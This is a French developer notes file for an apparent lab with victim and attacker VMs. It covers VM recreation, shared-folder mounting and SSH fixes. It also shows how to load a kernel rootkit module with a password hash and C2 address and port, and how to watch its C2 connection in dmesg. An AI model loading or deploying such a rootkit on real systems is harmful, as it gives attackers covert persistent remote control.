# Notes pour les développeurs

Opérations de maintenance et cas particuliers utiles lors du développement.

---

## Recréer une VM

Le script est idempotent : les images de base (`debian-12-base.qcow2`, `arch-base.qcow2`) ne sont jamais supprimées. Seules les images des VMs elles-mêmes et les ISOs cloud-init sont à supprimer pour forcer une recréation.

```bash
# Recréer la victime uniquement
rm vms/victim.qcow2 vms/victim-seed.iso
./vm.sh victim

# Recréer l'attaquante uniquement
rm vms/attacker.qcow2 vms/attacker-seed.iso
./vm.sh attacker

# Recréer les deux (sans re-télécharger les images de base)
rm vms/victim.qcow2 vms/victim-seed.iso vms/attacker.qcow2 vms/attacker-seed.iso
./vm.sh attacker   # terminal 1
./vm.sh victim     # terminal 2
```

---

## Monter vmshare manuellement

Le montage de `vmshare/` est configuré automatiquement par cloud-init dans `/etc/fstab`. Si la VM est déjà démarrée et que le montage n'est pas actif :

```bash
sudo mount -t 9p -o trans=virtio hostshare /mnt/vmshare
```

---

## Charger le module manuellement

Pour tester une nouvelle version du `.ko` sans passer par la persistance.

Calculer le hash FNV-1a 32-bit du mot de passe (exemple avec `test`) :

```bash
python3 -c "
h = 2166136261
for c in 'test':
    h = ((h ^ ord(c)) * 16777619) & 0xFFFFFFFF
print(f'{h:08x}')
"
```

Résultat : `afd071e5`. Remplacez `'test'` par votre mot de passe.

Charger le module :

```bash
cd /mnt/vmshare/rootkit
sudo insmod wlkom.ko password_hash=afd071e5 c2_ip=192.168.100.10 c2_port=4444
```

Décharger :

```bash
sudo rmmod wlkom
```

---

## Logs kernel en temps réel

```bash
sudo dmesg -w
```

`Ctrl+C` pour arrêter. Utile pour observer la connexion au C2, les retries, ou le déchargement du module.

---

## Erreur SSH "REMOTE HOST IDENTIFICATION HAS CHANGED"

Après une recréation de VM, les clés SSH changent. SSH refuse la connexion par sécurité. Supprimez l'ancienne entrée dans `~/.ssh/known_hosts` :

```bash
ssh-keygen -R "[localhost]:10022"   # victime
ssh-keygen -R "[localhost]:10023"   # attaquante
```
